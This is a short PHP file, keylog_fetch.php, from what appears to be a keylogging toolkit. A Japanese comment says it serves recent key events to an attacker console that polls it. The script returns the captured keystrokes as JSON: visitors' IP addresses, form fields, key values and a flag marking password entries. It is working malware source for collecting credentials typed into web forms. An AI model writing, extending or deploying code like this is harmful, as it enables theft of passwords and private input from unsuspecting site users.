<?php
// keylog_fetch.php
// 直近のキーイベントを取得（攻撃者コンソールからポーリング）

header('Content-Type: application/json; charset=utf-8');
session_start();
require_once __DIR__ . '/db.php';

$limit = isset($_GET['limit']) ? max(1, min(200, (int)$_GET['limit'])) : 50;

try {
    $stmt = $pdo->prepare("SELECT id, occurred_at, ip_address, field, key_code, key_value, is_password FROM keylog_events ORDER BY id DESC LIMIT ?");
    $stmt->bindValue(1, $limit, PDO::PARAM_INT);
    $stmt->execute();
    $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
    echo json_encode(['ok' => true, 'events' => $rows], JSON_UNESCAPED_UNICODE);
} catch (Throwable $e) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'DB error']);
}
